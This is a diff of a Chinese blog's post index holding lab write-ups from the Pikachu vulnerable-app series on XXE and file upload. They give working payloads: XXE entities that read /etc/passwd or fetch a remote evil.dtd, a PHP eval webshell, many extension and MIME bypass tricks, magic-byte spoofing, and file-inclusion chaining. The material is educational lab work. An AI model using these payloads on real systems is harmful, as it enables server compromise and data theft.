-    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
-<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
-<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
-<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-
-<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
-<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
-<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
-
-<p>不止这些，不同的语言支持的协议不同</p>
-<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
-<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
-<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
-<p>则可能存在XXE漏洞</p>
-<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-xss</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
     <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
@@ -1758,6 +1794,117 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-文件上传</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先保存一个shell.php用于上传</p>
+<p>当上传时，会显示文件不符合要求</p>
+<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
+<p>其实弹窗已经可以初步判断是客户端校验了</p>
+<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
+<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
+<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
+<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
+<p>直接将其删除</p>
+<p>此时再上传就不会有任何问题</p>
+<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
+<p>蚁剑成功连接</p>
+<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
+<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
+<p>但同样为保留字符的0x80不行</p>
+<p>在文件后缀名后的hex添加一个81</p>
+<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
+<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
+<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
+<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
+<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
+
+<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
+
+<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
+<p>从而达到绕过的目的</p>
+<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
+<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
+
+<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
+
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
+<p>可以看到还校验了文件内容</p>
+<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>这是gif文件的文件头</p>
+<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
+<p>2.更改后缀为png</p>
+<p>3.更改MIME类型为image&#x2F;png</p>
+<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
+<p>成功上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
+<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
+<p>MIME是由上传文件的body的Content-Type指定的</p>
+<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
+<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
+<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
+<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
+<p>将其改为jpg或png的MIME类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
+<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
+<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
+
+<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
+
+<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
+
+<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-文件包含</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><p><img src="/images/1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png" alt="img"></p>
@@ -1935,117 +2082,6 @@
 
 <p><img src="/images/image-20230110105123160.png" alt="image-20230110105123160"></p>
 ]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-文件上传</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>首先保存一个shell.php用于上传</p>
-<p>当上传时，会显示文件不符合要求</p>
-<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
-<p>其实弹窗已经可以初步判断是客户端校验了</p>
-<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
-<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
-<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
-<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
-<p>直接将其删除</p>
-<p>此时再上传就不会有任何问题</p>
-<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
-<p>蚁剑成功连接</p>
-<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
-<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
-<p>但同样为保留字符的0x80不行</p>
-<p>在文件后缀名后的hex添加一个81</p>
-<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
-<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
-<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
-<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
-
-<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
-
-<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
-
-<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
-
-<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
-<p>从而达到绕过的目的</p>
-<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
-<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
-
-<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span 